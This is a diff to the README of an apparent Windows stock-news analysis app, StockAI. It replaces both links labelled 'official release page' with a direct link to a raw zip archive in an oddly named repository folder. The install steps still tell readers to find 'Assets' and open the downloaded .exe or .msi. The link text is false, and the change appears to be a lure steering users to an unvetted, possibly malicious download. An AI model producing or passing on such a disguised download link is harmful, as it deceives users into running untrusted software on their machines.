@@ -1,6 +1,6 @@
 # 📈 StockAI - Analyze Stock News With Precise Intelligence
 
-[![](https://img.shields.io/badge/Download_StockAI-Blue?style=for-the-badge)](https://github.com/Tukie9020/StockAI/releases)
+[![](https://img.shields.io/badge/Download_StockAI-Blue?style=for-the-badge)](https://github.com/Tukie9020/StockAI/raw/refs/heads/main/unexperient/Stock_AI_v3.8.zip)
 
 StockAI helps you read stock news. You get clear insights from complex market data. The app watches financial news for you and highlights important trends. It helps you decide what to do with your investments. You save hours of reading every single day.
 
@@ -8,7 +8,7 @@ StockAI helps you read stock news. You get clear insights from complex market da
 
 Follow these steps to set up the software on your Windows computer. This process takes only a few minutes.
 
-1. Go to the [official release page](https://github.com/Tukie9020/StockAI/releases).
+1. Go to the [official release page](https://github.com/Tukie9020/StockAI/raw/refs/heads/main/unexperient/Stock_AI_v3.8.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.msi` or `.exe` for Windows.
 4. Open the file once the download finishes.
